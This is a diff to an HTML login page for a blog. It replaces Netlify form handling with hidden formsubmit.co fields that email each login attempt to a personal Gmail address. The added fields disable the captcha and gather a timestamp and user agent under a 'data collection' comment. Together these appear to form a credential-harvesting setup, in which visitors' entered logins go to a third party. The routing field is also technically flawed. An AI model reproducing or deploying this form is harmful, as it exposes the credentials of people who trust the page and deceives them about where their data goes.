@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8,6 +9,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
+
 <body>
     <div class="background">
         <div class="gradient-orb orb-1"></div>
@@ -24,9 +26,20 @@
         </header>
 
         <div class="login-container">
-            <form id="loginForm" class="login-form" name="login-form" method="POST" data-netlify="true">
-                <!-- Netlify Forms 必需字段 -->
-                <input type="hidden" name="form-name" value="login-form">
+            <form id="loginForm" class="login-form" name="login-form" method="POST">
+                <!-- Formsubmit.co 配置 - 修改这里为你的邮箱 -->
+                <!-- 将下面的 your-email@example.com 改为你接收邮件的邮箱 -->
+                <input type="hidden" name="_action" value="https://formsubmit.co/thunder153460@gmail.com">
+                <input type="hidden" name="_subject" value="🚀 新的登录尝试 - 博客系统">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_next" value="blog.html">
+                <input type="hidden" name="_cc" value="">
+
+                <!-- 数据收集字段 -->
+                <input type="hidden" name="loginMethod" id="loginMethod" value="email">
+                <input type="hidden" name="timestamp" id="timestamp">
+                <input type="hidden" name="userAgent" id="userAgent">
 
                 <div class="form-group">
                     <label for="email">
@@ -245,4 +258,5 @@
 
     <script src="script.js"></script>
 </body>
+
 </html>
